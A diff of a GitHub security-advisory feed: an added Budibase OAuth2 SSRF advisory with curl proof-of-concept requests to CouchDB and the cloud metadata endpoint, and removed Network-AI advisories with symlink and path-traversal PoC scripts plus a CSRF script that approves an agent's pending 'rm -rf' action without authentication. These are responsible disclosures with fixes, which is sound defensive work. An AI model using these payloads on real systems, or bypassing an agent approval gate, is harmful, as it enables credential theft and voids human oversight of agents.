+<p><code>fetchToken</code> in the OAuth2 SDK makes a POST to a builder-supplied URL with plain node-fetch, skipping the <code>blacklist.isBlacklisted</code> check that every other outbound fetch path in the codebase uses. The Joi schema for the OAuth2 URL has no scheme or host restriction. Alice, a builder, points an OAuth2 config at <code>http://169.254.169.254/...</code> or <code>http://127.0.0.1:5984/</code>; the server connects and returns response-body fragments in the validation result.</p>
+<h2 id="details">Details</h2>
+<p><code>packages/server/src/sdk/workspace/oauth2/utils.ts:17-65</code> defines <code>fetchToken</code>. Near the end:</p>
+<pre><code class="language-typescript">const resp = await fetch(config.url, fetchConfig)
+</code></pre>
+<p><code>config.url</code> is whatever the builder stored. <code>fetchConfig</code> has <code>redirect: "follow"</code> (the default), so a public URL that returns 302 to an internal target is also reachable.</p>
+<p>The route validation at <code>packages/server/src/api/routes/oauth2.ts:9</code> accepts any string:</p>
+<pre><code class="language-typescript">url: Joi.string().required(),
+</code></pre>
+<p>The controller passes the URL into <code>fetchToken</code> through <code>crud.ts</code>. The <code>/api/oauth2/validate</code> endpoint (builder role) is the most direct attack path: it lives on <code>builderRoutes</code>, takes the URL from the body, fires the fetch, and returns a validation envelope that includes the upstream error string.</p>
+<p>Compare with every other outbound fetch in the codebase:</p>
+<ul>
+<li><code>packages/server/src/integrations/rest.ts:754</code> calls <code>blacklist.isBlacklisted(url)</code> before its fetch (though it does not re-check redirects; see companion advisory for REST-redirect SSRF).</li>
+<li><code>packages/backend-core/src/utils/outboundFetch.ts:98-100</code> sets <code>redirect: "manual"</code> and re-validates each hop.</li>
+<li><code>packages/server/src/automations/steps/outgoingWebhook.ts</code> routes through <code>fetchWithBlacklist</code>.</li>
+</ul>
+<p>The default blacklist blocks <code>127.0.0.0/8</code>, <code>169.254.0.0/16</code>, <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code> (<code>packages/backend-core/src/blacklist/blacklist.ts:6-16</code>). The OAuth2 path never consults it.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Tested against Budibase 3.35.8 (built from master at f960e361).</p>
+<p>Step 1: Alice, a builder, POSTs an OAuth2 config pointed at CouchDB on the same host as Budibase:</p>
+<pre><code class="language-bash">curl -sS -b "$BUILDER_COOKIE" -X POST "$BASE/api/oauth2/validate" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1:5984/","clientId":"t","clientSecret":"t",
+       "method":"BODY","grantType":"client_credentials"}'
+</code></pre>
+<p>Server response:</p>
+<pre><code class="language-json">{"valid":false,"message":"Method Not Allowed"}
+</code></pre>
+<p>Budibase reached CouchDB (which rejects POST at <code>/</code> with 405). Without the blacklist bypass this request would be blocked at the IP check.</p>
+<p>Step 2: Probe the cloud metadata range:</p>
+<pre><code class="language-bash">curl -sS -b "$BUILDER_COOKIE" -X POST "$BASE/api/oauth2/validate" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://169.254.169.254/latest/meta-data/","clientId":"t","clientSecret":"t","method":"BODY","grantType":"client_credentials"}'
+</code></pre>
+<p>Server response:</p>
+<pre><code class="language-json">{"valid":false,"message":"invalid json response body at http://169.254.169.254/latest/meta-data/ reason: Unexpected token 'N', \"Not Found\" is not valid JSON"}
+</code></pre>
+<p>The <code>"Not Found"</code> substring is the upstream body; the server reached the link-local metadata endpoint and leaked the first bytes of the response into the validation error.</p>
+<h2 id="impact">Impact</h2>
+<p>Two concrete paths, both reachable from any builder account (free-tier signup on Budibase Cloud is enough):</p>
+<ol>
+<li><strong>Cross-tenant data read on Cloud.</strong> Budibase Cloud multi-tenants on a shared CouchDB; each tenant gets its own <code>&lt;tenantId&gt;_global-db</code> and <code>app_&lt;id&gt;</code> databases on the same port 5984. The blacklist is what keeps a builder from talking to CouchDB directly. With that bypassed, Alice can <code>GET http://127.0.0.1:5984/_all_dbs</code> via a 302 redirector and enumerate every other tenant's databases, then read their <code>_users</code>, app definitions, and datasource configs (which include third-party credentials). None of this traffic goes through Budibase's tenant isolation layer, so standard app-level access controls do not apply.</li>
+<li><strong>IAM credential exfiltration.</strong> Alice points the URL at <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;/</code> and receives the instance role credentials in the validation error path. Those credentials carry whatever AWS permissions the Budibase instance role holds.</li>
+</ol>
+<p>Self-hosted deployments face the same CouchDB/Redis/MinIO access plus any other service reachable on the host or pod network. The blacklist was explicitly added to prevent exactly this, and every other outbound fetch path uses it.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Call <code>blacklist.isBlacklisted</code> before the fetch and set <code>redirect: "manual"</code> on <code>fetchConfig</code>, matching the pattern in <code>outboundFetch.ts</code>:</p>
+<pre><code class="language-typescript">import { blacklist } from "@budibase/backend-core"
+
+async function fetchToken(config: { url: string; /* ... */ }) {
+  config = await processEnvironmentVariable(config)
+  if (await blacklist.isBlacklisted(config.url)) {
+    throw new Error("OAuth2 token URL is blocked.")
+  }
+  const fetchConfig: RequestInit = {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: new URLSearchParams({ grant_type: "client_credentials" }),
+    redirect: "manual",
+  }
+  // ...
+}
+</code></pre>
+<p>Alternatively, replace the <code>fetch</code> call with <code>fetchWithBlacklist</code>, which handles both checks and re-validates redirect targets.</p>
+<hr>
+<p><em>Found by <a href="https://aisafe.io">aisafe.io</a></em></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-4q6h-8p4v-67vq">https://github.com/Budibase/budibase/security/advisories/GHSA-4q6h-8p4v-67vq</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48153">https://nvd.nist.gov/vuln/detail/CVE-2026-48153</a></li>
+<li><a href="https://github.com/advisories/GHSA-4q6h-8p4v-67vq">https://github.com/advisories/GHSA-4q6h-8p4v-67vq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4q6h-8p4v-67vq</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-22T22:45:35.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[@actual-app/sync-server] @actual-app/sync-server's missing authorization on GET /secret/:name allows non-admin OpenID users to enumerate admin-configured bank-sync secrets]]></title>
         <id>https://github.com/advisories/GHSA-3f62-qv96-4p78</id>
@@ -2556,642 +3753,5 @@ if __name__ == "__main__":
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-06-19T21:42:43.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[network-ai] Network-AI: EnvironmentManager.backup() follows symlinked directories and copies files outside the environment root into backups]]></title>
-        <id>https://github.com/advisories/GHSA-6x2m-p4xp-wg22</id>
-        <link href="https://github.com/advisories/GHSA-6x2m-p4xp-wg22"/>
-        <updated>2026-06-19T21:42:40.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>EnvironmentManager.backup()</code> recursively collects files using <code>_collectBackupFiles()</code>. <code>_collectBackupFiles()</code> uses <code>statSync(full)</code>, which follows symlinks. If <code>data/&lt;env&gt;</code> contains a symlink to a directory outside the environment root, backup recursion follows the symlink and copies external files into <code>data/&lt;env&gt;/.backups/&lt;backupId&gt;/</code>.</p>
-<p>An attacker who can place a symlink under the environment data directory can cause backup operations to disclose files outside the environment root into backup artifacts. Confirmed in Network-AI 5.12.1.</p>
-<h3 id="details">Details</h3>
-<p><code>backup()</code> collects file paths and copies them into the backup directory:</p>
-<pre><code class="language-ts">const files = this._collectBackupFiles(envDir);
-for (const rel of files) {
-  const src = join(envDir, rel);
-  const dst = join(backupPath, rel);
-  mkdirSync(join(backupPath, rel.includes('/') ? rel.substring(0, rel.lastIndexOf('/')) : '.'), { recursive: true });
-  try { copyFileSync(src, dst); } catch { /* skip unreadable */ }
-}
-</code></pre>
-<p><code>_collectBackupFiles()</code> follows symlinked directories because it calls <code>statSync()</code>, not <code>lstatSync()</code>:</p>
-<pre><code class="language-ts">const info = statSync(full);
-if (info.isDirectory()) {
-  walk(full, rel);
-} else {
-  results.push(rel);
-}
-</code></pre>
-<p>Default CLI reachability exists through <code>network-ai env backup create --env &lt;env&gt;</code>. <code>backup()</code> also runs automatically before promotion and restore operations.</p>
-<p>Affected source evidence:</p>
-<ul>
-<li><code>lib/env-manager.ts:435-460</code> — backup copy logic.</li>
-<li><code>lib/env-manager.ts:596-617</code> — symlink-following <code>_collectBackupFiles()</code>.</li>
-<li><code>bin/cli.ts:413-420</code> — default CLI exposes backup creation.</li>
-<li><code>lib/env-manager.ts:294-297</code> and <code>483-484</code> — backup also runs before promote/restore.</li>
-</ul>
-<h3 id="poc">PoC</h3>
-<p>This PoC uses only temporary files. It creates a symlink inside <code>data/dev</code> pointing to an external directory, then runs <code>backup('dev')</code> and observes that the external file is copied into the backup:</p>
-<pre><code class="language-bash">TMP=$(mktemp -d)
-TMPBASE="$TMP" node -r ts-node/register/transpile-only - &lt;&lt;'TS'
-const { EnvironmentManager } = require('./lib/env-manager');
-const fs = require('fs');
-const path = require('path');
-const base = process.env.TMPBASE;
-const data = path.join(base, 'data');
-const outside = path.join(base, 'outside');
-
-fs.mkdirSync(outside, { recursive: true });
-fs.writeFileSync(path.join(outside, 'secret.txt'), 'secret-through-symlink');
-
-const mgr = new EnvironmentManager(data, {
-  chain: ['dev', 'st'],
-  gates: { dev: 'auto', st: 'auto' },
-});
-
-mgr.init('dev');
-fs.symlinkSync(outside, path.join(data, 'dev', 'linked-outside'), 'dir');
-
-const result = mgr.backup('dev');
-const copied = path.join(result.path, 'linked-outside', 'secret.txt');
-
-console.log(JSON.stringify({
-  copied: fs.existsSync(copied),
-  content: fs.readFileSync(copied, 'utf8'),
-}, null, 2));
-
-fs.rmSync(base, { recursive: true, force: true });
-TS
-</code></pre>
-<p>Observed result: <code>copied</code> is <code>true</code> and <code>content</code> is <code>secret-through-symlink</code>.</p>
-<h3 id="impact">Impact</h3>
-<p>An attacker who can place a symlink in <code>data/&lt;env&gt;</code> can cause backup creation to copy arbitrary readable files from outside the environment root into <code>data/&lt;env&gt;/.backups/&lt;backupId&gt;/</code>. This can disclose secrets or local files to any actor/process that can later read or export Network-AI backup artifacts. No RCE chain was confirmed.</p>
-<hr>
-<h3 id="resolution-maintainer">Resolution (maintainer)</h3>
-<p><strong>Fixed in <a href="https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2">v5.12.2</a> (commit <code>a59c13a</code>).</strong> Install: <code>npm install network-ai@5.12.2</code> — published to npm with provenance.</p>
-<p><code>_collectBackupFiles()</code> now uses <code>lstatSync</code> instead of <code>statSync</code> and skips any entry where <code>isSymbolicLink()</code> is true. Symlinks are never traversed, so <code>backup()</code> can no longer follow a link out of the environment root and copy external files into a backup artifact.</p>
-<p>All 3,269 tests pass against the patched build. Thanks to @sondt99 for the responsible disclosure.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-6x2m-p4xp-wg22">https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-6x2m-p4xp-wg22</a></li>
-<li><a href="https://github.com/Jovancoding/Network-AI/commit/a59c13a1f0ce0e8a0779a90343eef92fac5ab4c3">https://github.com/Jovancoding/Network-AI/commit/a59c13a1f0ce0e8a0779a90343eef92fac5ab4c3</a></li>
-<li><a href="https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2">https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-6x2m-p4xp-wg22">https://github.com/advisories/GHSA-6x2m-p4xp-wg22</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-6x2m-p4xp-wg22</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-19T21:42:36.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[network-ai] Network-AI: EnvironmentManager.restore() backup ID path traversal copies arbitrary directories into environment data]]></title>
-        <id>https://github.com/advisories/GHSA-48x2-6pr9-2jjf</id>
-        <link href="https://github.com/advisories/GHSA-48x2-6pr9-2jjf"/>
-        <updated>2026-06-19T21:42:40.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>EnvironmentManager.restore(env, backupId)</code> computes the backup path with <code>join(envDir, '.backups', backupId)</code> and only checks that this path exists. It does not resolve the result or verify that it remains under <code>data/&lt;env&gt;/.backups</code>.</p>
-<p>A caller can pass a traversal backup ID such as <code>../../../outside/source-dir</code> to restore files from an arbitrary directory into the target environment data directory. Confirmed in Network-AI 5.12.1.</p>
-<h3 id="details">Details</h3>
-<p><code>restore()</code> builds <code>backupPath</code> directly from caller-controlled <code>backupId</code>:</p>
-<pre><code class="language-ts">restore(env: EnvName, backupId: string): RestoreResult {
-  const envDir = this.getDataDir(env);
-  const backupsDir = join(envDir, '.backups');
-  const backupPath = join(backupsDir, backupId);
-
-  if (!existsSync(backupPath)) {
-    throw new Error(`Backup '${backupId}' not found for environment '${env}'`);
-  }
-
-  this.backup(env);
-
-  const files = this._collectBackupFiles(backupPath);
-  let restored = 0;
-  for (const rel of files) {
-    if (rel === '_manifest.json') continue;
-    const src = join(backupPath, rel);
-    const dst = join(envDir, rel);
-    try {
-      mkdirSync(join(envDir, rel.includes('/') ? rel.substring(0, rel.lastIndexOf('/')) : '.'), { recursive: true });
-      copyFileSync(src, dst);
-      restored++;
-    } catch { /* skip */ }
-  }
-
-  return { backupId, env, filesRestored: restored };
-}
-</code></pre>
-<p>There is no resolved containment check that ensures <code>backupPath</code> remains under <code>backupsDir</code>.</p>
-<p>Default CLI reachability exists through <code>network-ai env backup restore --env &lt;env&gt; --backup &lt;id&gt;</code>.</p>
-<p>Affected source evidence:</p>
-<ul>
-<li><code>lib/env-manager.ts:474-499</code> — vulnerable restore path construction and copy.</li>
-<li><code>bin/cli.ts:441-458</code> — default CLI exposes restore with caller-controlled <code>--backup</code>.</li>
-</ul>
-<h3 id="poc">PoC</h3>
-<p>This PoC uses only temporary directories and restores <code>trust_levels.json</code> from an external directory into <code>data/dev</code>:</p>
-<pre><code class="language-bash">TMP=$(mktemp -d)
-TMPBASE="$TMP" node -r ts-node/register/transpile-only - &lt;&lt;'TS'
-const { EnvironmentManager } = require('./lib/env-manager');
-const fs = require('fs');
-const path = require('path');
-const base = process.env.TMPBASE;
-const data = path.join(base, 'data');
-const source = path.join(base, 'outside', 'secret-src');
-
-fs.mkdirSync(source, { recursive: true });
-fs.writeFileSync(path.join(source, 'trust_levels.json'), '{"leaked":true}');
-
-const mgr = new EnvironmentManager(data, {
-  chain: ['dev', 'st'],
-  gates: { dev: 'auto', st: 'auto' },
-});
-
-mgr.init('dev');
-const backupId = path.relative(path.join(data, 'dev', '.backups'), source);
-const result = mgr.restore('dev', backupId);
-const restored = fs.readFileSync(path.join(data, 'dev', 'trust_levels.json'), 'utf8');
-
-console.log(JSON.stringify({ backupId, filesRestored: result.filesRestored, restored }, null, 2));
-fs.rmSync(base, { recursive: true, force: true });
-TS
-</code></pre>
-<p>Observed result includes <code>backupId: "../../../outside/secret-src"</code>, <code>filesRestored: 1</code>, and restored content <code>{"leaked":true}</code>.</p>
-<h3 id="impact">Impact</h3>
-<p>A caller that can invoke backup restore can copy arbitrary readable directories into <code>data/&lt;env&gt;</code>, subject to process filesystem permissions. This can stage sensitive files into environment data/backup locations, overwrite environment configuration files if matching filenames exist, and break environment isolation. No RCE chain was confirmed.</p>
-<hr>
-<h3 id="resolution-maintainer">Resolution (maintainer)</h3>
-<p><strong>Fixed in <a href="https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2">v5.12.2</a> (commit <code>a59c13a</code>).</strong> Install: <code>npm install network-ai@5.12.2</code> — published to npm with provenance.</p>
-<p><code>restore()</code> now validates <code>backupId</code> against <code>/^[\w\-]+$/</code> and asserts <code>dirname(resolve(join(backupsDir, backupId))) === resolve(backupsDir)</code> before touching the filesystem. Backup IDs containing path separators or <code>..</code> are rejected, so a crafted ID can no longer copy directories from outside <code>.backups/</code> into the environment.</p>
-<p>All 3,269 tests pass against the patched build. Thanks to @sondt99 for the responsible disclosure.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-48x2-6pr9-2jjf">https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-48x2-6pr9-2jjf</a></li>
-<li><a href="https://github.com/Jovancoding/Network-AI/commit/a59c13a1f0ce0e8a0779a90343eef92fac5ab4c3">https://github.com/Jovancoding/Network-AI/commit/a59c13a1f0ce0e8a0779a90343eef92fac5ab4c3</a></li>
-<li><a href="https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2">https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-48x2-6pr9-2jjf">https://github.com/advisories/GHSA-48x2-6pr9-2jjf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-48x2-6pr9-2jjf</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-19T21:42:38.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[network-ai] Network-AI: ApprovalInbox HTTP server has no authentication — anyone can approve pending agent actions ]]></title>
-        <id>https://github.com/advisories/GHSA-mxjx-28vx-xjjj</id>
-        <link href="https://github.com/advisories/GHSA-mxjx-28vx-xjjj"/>
-        <updated>2026-06-19T21:42:35.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>network-ai</code>'s <code>ApprovalInbox</code> (<code>lib/approval-inbox.ts</code>) is a shipped, exported, documented feature — <em>"a web-accessible approval queue with REST API … and SSE streaming"</em> (SECURITY.md). It is the network surface of the <strong>human-in-the-loop Approval Gate</strong>, which <code>ApprovalGate</code> uses to require explicit human approval for <em>"high-risk operations (writes, shell commands, budget spend)"</em> (SECURITY.md). The HTTP server it exposes has <strong>no authentication of any kind</strong> and sets <strong><code>Access-Control-Allow-Origin: *</code></strong> on every route, including the state-changing <code>POST /approvals/:id/approve</code> and <code>/deny</code>.</p>
-<p>As a result, any party who can send an HTTP request to the inbox port — a co-located process, a container/SSRF on the same host, a remote client when the operator binds a non-loopback address, <strong>or any website the operator visits in a browser (via the wildcard CORS)</strong> — can <strong>enumerate pending approvals and approve them</strong>, defeating the entire human-in-the-loop control and causing the gated high-risk action (e.g. a shell command the agent was holding for review) to execute without consent.</p>
-<p>This is the same vulnerability class the maintainer has already fixed twice on the MCP server (GHSA-fj4g-2p96-q6m3 missing auth; GHSA-j3vx-cx2r-pvg8 empty default secret) — the auxiliary <code>ApprovalInbox</code> server never received that hardening.</p>
-<ul>
-<li><strong>Affected:</strong> <code>network-ai &lt;= 5.11.0</code> (current latest), <code>lib/approval-inbox.ts</code> — <code>httpHandler()</code> / <code>routeRequest()</code> / <code>startServer()</code>. <code>ApprovalInbox</code> is public API (exported from <code>index.ts:1126</code>).</li>
-<li><strong>CWE:</strong> <a href="https://cwe.mitre.org/data/definitions/862.html">CWE-862</a> (Missing Authorization) + <a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352</a> (Cross-Site Request Forgery, via wildcard CORS).</li>
-<li><strong>CVSS v3.1 (proposed):</strong><ul>
-<li>Drive-by CSRF against the default <code>127.0.0.1</code> deployment: <code>AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N</code> = <strong>5.9 Medium</strong>.</li>
-<li>Direct request when the operator binds a non-loopback address (or local/SSRF reach): <code>AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N</code> = <strong>8.1 High</strong>.</li>
-</ul>
-</li>
-</ul>
-<h2 id="details">Details</h2>
-<h3 id="no-authentication-on-the-request-pipeline-libapproval-inboxts">No authentication on the request pipeline (<code>lib/approval-inbox.ts</code>)</h3>
-<p><code>httpHandler()</code> sets a wildcard CORS policy and routes every request straight to <code>routeRequest()</code> with <strong>no auth check</strong>:</p>
-<pre><code class="language-js">// lib/approval-inbox.ts:250-275
-httpHandler() {
-  return (req, res) =&gt; {
-    ...
-    res.setHeader('Access-Control-Allow-Origin', '*');          // 256  &lt;-- wildcard CORS
-    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }   // preflight OK for any origin
-    ...
-    this.routeRequest(req, res, subPath, url);                  // 273  &lt;-- no token / secret / origin gate
-  };
-}
-</code></pre>
-<p><code>routeRequest()</code> exposes list + approve/deny with no credential check (default <code>pathPrefix</code> = <code>/approvals</code>):</p>
-<pre><code class="language-js">// lib/approval-inbox.ts:369-405
-routeRequest(req, res, subPath, url) {
-  if (subPath === '/' &amp;&amp; req.method === 'GET') {                       // GET /approvals/  -&gt; enumerate pending ids
-    this.sendJson(res, 200, this.list(status)); return;
-  }
-  ...
-  const approveMatch = subPath.match(/^\/([a-f0-9]+)\/approve$/);      // POST /approvals/:id/approve
-  if (approveMatch &amp;&amp; req.method === 'POST') {
-    this.readBody(req).then((body) =&gt; {
-      const approvedBy = typeof body.approvedBy === 'string' ? body.approvedBy : 'anonymous';  // defaults to 'anonymous'
-      const entry = this.approve(approveMatch[1], approvedBy, reason);  // resolves the gate -&gt; action proceeds
-      ...
-    });
-  }
-}
-</code></pre>
-<p><code>approve()</code> resolves the pending promise that <code>ApprovalGate</code> is awaiting, so the gated action proceeds:</p>
-<pre><code class="language-js">// lib/approval-inbox.ts:172-183 / 327-339
-approve(id, approvedBy, reason) {
-  ...
-  return this.resolve(id, 'approved', { approved: true, approvedBy, reason });  // promise -&gt; {approved:true}
-}
-</code></pre>
-<p><code>startServer()</code> binds the handler (default <code>127.0.0.1</code>, but any host the caller passes):</p>
-<pre><code class="language-js">// lib/approval-inbox.ts:281-286
-startServer(port, hostname = '127.0.0.1') {
-  const server = createServer(this.httpHandler());
-  server.listen(port, hostname);
-  return server;
-}
-</code></pre>
-<p>There is <strong>no option</strong> to supply a secret/token (unlike <code>McpSseServer</code>/<code>McpHttpServer</code>, which require one and fail closed), and the wildcard <code>ACAO: *</code> is hardcoded — an operator cannot configure their way out of it.</p>
-<h3 id="why-the-wildcard-cors-matters">Why the wildcard CORS matters</h3>
-<p>The two routes needed for exploitation are reachable cross-origin:</p>
-<ul>
-<li><code>GET /approvals/?status=pending</code> is a CORS <em>simple request</em>; <code>ACAO: *</code> lets a malicious page <strong>read</strong> the response and learn the pending approval ids.</li>
-<li><code>POST /approvals/:id/approve</code> with <code>Content-Type: application/json</code> triggers a preflight, which succeeds because the server answers <code>OPTIONS</code> with <code>ACAO: *</code>, <code>Access-Control-Allow-Methods: …POST…</code>, and <code>Access-Control-Allow-Headers: Content-Type</code>. The browser then sends the approve. <code>approvedBy</code> defaults to <code>'anonymous'</code>, so no special body is required.</li>
-</ul>
-<p>So a website the operator merely visits while the inbox is running can enumerate and approve all pending high-risk actions.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<p>Self-contained against the <strong>published <code>network-ai@5.11.0</code></strong> package (no project files needed; re-confirmed 2026-06-17). It starts the documented <code>ApprovalInbox</code> server, has an agent submit a high-risk gated action, then acts as an <strong>unauthenticated</strong> client.</p>
-<pre><code class="language-bash">mkdir na-poc &amp;&amp; cd na-poc &amp;&amp; npm init -y &gt;/dev/null &amp;&amp; npm i network-ai@5.11.0
-node poc.mjs
-</code></pre>
-<p><code>poc.mjs</code>:</p>
-<pre><code class="language-js">import { ApprovalInbox } from "network-ai";
-import http from "node:http";
-
-const PORT = 7798;
-const req = (method, path, body) =&gt; new Promise((resolve, reject) =&gt; {        // plain client — NO Authorization header
-  const data = body ? JSON.stringify(body) : undefined;
-  const r = http.request({ host: "127.0.0.1", port: PORT, method, path,
-    headers: data ? { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } : {} },
-    (res) =&gt; { let b = ""; res.on("data", c =&gt; b += c); res.on("end", () =&gt; { let j; try { j = JSON.parse(b); } catch { j = b; } resolve({ status: res.statusCode, json: j }); }); });
-  r.on("error", reject); if (data) r.write(data); r.end();
-});
-
-const inbox = new ApprovalInbox();
-const gate = inbox.callback();                                 // what ApprovalGate calls before a dangerous action
-inbox.startServer(PORT, "127.0.0.1");                          // the documented "web-accessible approval queue"
-await new Promise(r =&gt; setTimeout(r, 150));
-
-let resolved = false;
-const decisionP = gate({ action: "shell_execute", target: "rm -rf /important/data",
-  agentId: "worker-1", justification: "cleanup", riskLevel: "high" }).then(d =&gt; (resolved = true, d));
-console.log("Gated dangerous action pending human approval. resolved =", resolved);
-
-const list = await req("GET", "/approvals/?status=pending");   // attacker enumerates pending approvals
-const id = list.json[0].id;
-const approve = await req("POST", `/approvals/${id}/approve`, { approvedBy: "attacker" });  // and approves one
-console.log("[attacker] GET /approvals/  (no auth) -&gt;", list.status, "ids:", list.json.map(e =&gt; e.id));
-console.log("[attacker] POST /approvals/" + id + "/approve (no auth) -&gt;", approve.status, approve.json?.status);
-const decision = await decisionP;
-console.log("&gt;&gt;&gt; gate decision delivered to agent:", JSON.stringify(decision), "| WIPED WITHOUT AUTH:", decision.approved &amp;&amp; resolved);
-</code></pre>
-<p>Output:</p>
-<pre><code>Gated dangerous action pending human approval. resolved = false
-[attacker] GET /approvals/  (no auth) -&gt; 200 ids: [ '07d6f277efe35ac1' ]
-[attacker] POST /approvals/07d6f277efe35ac1/approve (no auth) -&gt; 200 approved
-&gt;&gt;&gt; gate decision delivered to agent: {"approved":true,"approvedBy":"attacker"} | WIPED WITHOUT AUTH: true
-</code></pre>
-<p>The gated action (<code>shell_execute: rm -rf /important/data</code>, <code>riskLevel: high</code>) is approved by a client that sent <strong>no <code>Authorization</code> header</strong>, and the <code>ApprovalGate</code> promise resolves <code>{ approved: true }</code> — the agent proceeds.</p>
-<p>Browser CSRF variant (no tooling, just a visited page):</p>
-<pre><code class="language-html">&lt;script&gt;
-fetch('http://127.0.0.1:PORT/approvals/?status=pending')      // ACAO:* -&gt; readable
-  .then(r =&gt; r.json())
-  .then(list =&gt; list.forEach(e =&gt;
-    fetch(`http://127.0.0.1:PORT/approvals/${e.id}/approve`, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ approvedBy: 'attacker' })          // preflight passes via ACAO:*
-    })));
-&lt;/script&gt;
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>The Approval Gate is the package's human-in-the-loop safety control for high-risk agent operations (shell commands, file writes, budget spend — SECURITY.md). Unauthenticated, cross-origin access to its inbox lets an attacker:</p>
-<ul>
-<li><strong>Approve</strong> any pending gated action → the agent executes an operation that was explicitly held for human review (integrity/availability impact; the gated action is whatever the agent proposed).</li>
-<li><strong>Read</strong> pending requests (<code>GET /approvals</code>, <code>/stats</code>) → disclosure of queued action details (command strings, file paths, justifications).</li>
-<li><strong>Deny</strong> pending actions → suppress legitimate operations.</li>
-</ul>
-<p>The attacker controls the <em>approval decision</em>, not the action content, but the net effect is that the human-in-the-loop guarantee is void for any deployment that exposes the inbox — which is the inbox's documented purpose ("web-accessible approval queue").</p>
-<h2 id="alignment-with-the-security-policy--documentation-in-scope-not-intendeddocumented-behavior">Alignment with the security policy &amp; documentation (in scope; not intended/documented behavior)</h2>
-<p>This finding does not contradict any documented design choice — it exposes a gap the documentation overlooks, and it matches a vulnerability class the maintainer has already accepted:</p>
-<ul>
-<li><strong>Documented as a <em>security measure</em>, never as intentionally unauthenticated.</strong> <code>SECURITY.md</code> lists the Approval Inbox under "Security Measures in Network-AI" — <em>"<code>ApprovalInbox</code> provides a web-accessible approval queue with REST API (<code>/list</code>, <code>/approve/:id</code>, <code>/deny/:id</code>, <code>/stats</code>)"</em> — and <code>README.md</code> / <code>ENTERPRISE.md</code> describe it the same way. <strong>No</strong> document states it requires authentication, nor that the operator must place it behind their own auth. A documented security control (human-in-the-loop approval for <em>"writes, shell commands, budget spend"</em>) that anyone can bypass without credentials is a defect in that control, not its intended behavior.</li>
-<li><strong>The project's own threat model treats this exact adversary as in scope.</strong> <code>THREAT_MODEL.md</code> §3.1 designs against an <em>"Unauthenticated Network Caller"</em> that can reach a bound TCP port, with mitigations: <em>require a non-empty secret, default to <code>127.0.0.1</code>, warn on non-loopback bind.</em> It applies all of these to the MCP server — but it <strong>never lists <code>ApprovalInbox</code> as a network boundary at all</strong> (an omission, not a carve-out), and the inbox has <strong>none</strong> of those mitigations.</li>
-<li><strong>Direct precedent — the maintainer already fixed this class.</strong> The identical issue on the MCP server was accepted and patched: <strong>GHSA-j3vx-cx2r-pvg8</strong> ("Unauthenticated Cross-Origin MCP Tool Invocation," fixed in v5.4.5 by requiring a secret and <strong>restricting CORS to localhost origins</strong>) and <strong>GHSA-r78r-rwrf-rjwp</strong> (fail-closed on empty secret, v5.7.2). The <code>ApprovalInbox</code> is a second network-reachable server with the same flaw; it simply never received that hardening.</li>
-<li><strong>No carve-out covers it.</strong> The threat model's Explicit Non-Goals (localhost-IPC encryption, SLA, anti-analysis, npm-registry compromise) don't apply, and the documented ClawHub "by-design" Notes (ASI01 goal-hijack, ASI03 advisory tokens, ASI06 context poisoning, ASI07 <em>inter-agent messaging</em>) are unrelated — the approval inbox is a <strong>control plane</strong>, not inter-agent transport.</li>
